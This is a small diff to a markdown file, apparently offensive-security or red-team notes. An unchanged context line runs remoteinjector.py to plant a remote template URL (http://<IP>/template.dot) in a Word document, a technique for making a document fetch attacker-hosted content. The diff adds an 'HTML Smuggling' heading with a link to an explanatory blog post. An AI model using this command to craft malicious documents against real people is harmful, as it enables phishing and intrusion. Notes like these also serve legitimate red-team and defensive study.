@@ -212,3 +212,6 @@ End Sub
 ```
 python3 remoteinjector.py -w http://<IP>/template.dot document.docx
 ```
+
+## HTML Smuggling
+- https://outflank.nl/blog/2018/08/14/html-smuggling-explained/
